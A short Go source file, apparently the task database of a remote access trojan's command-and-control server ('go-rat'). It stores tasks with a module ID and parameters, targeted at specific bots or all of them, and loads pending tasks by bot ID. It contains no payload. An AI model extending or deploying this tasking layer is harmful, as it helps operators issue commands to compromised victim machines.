package main

import (
	"go-rat/utils/types"

	"github.com/glebarez/sqlite"
	"gorm.io/gorm"
)

var DB *gorm.DB

func InitDB() error {
	db, err := gorm.Open(sqlite.Open("rat.db"), &gorm.Config{})
	if err != nil {
		return err
	}

	db.AutoMigrate(&types.Task{})
	DB = db
	return nil
}

func CreateTask(module_id string, targets []string, parameters ...types.Parameter) (types.Task, error) {
	targetAll := len(targets) == 1 && targets[0] == "*"
	task := types.Task{
		ModuleID:   module_id,
		Parameters: parameters,
		Targets: func() []string {
			if targetAll {
				return []string{}
			} else {
				return targets
			}
		}(),
		TargetAll: targetAll,
	}
	DB.Create(&task)
	return task, nil
}

func LoadTasks(bot_id string) (*[]types.Task, error) {
	var tasks *[]types.Task
	DB.Where("? IN (targets)", bot_id).Or("target_all = ?", true).Find(&tasks)
	return tasks, nil
}
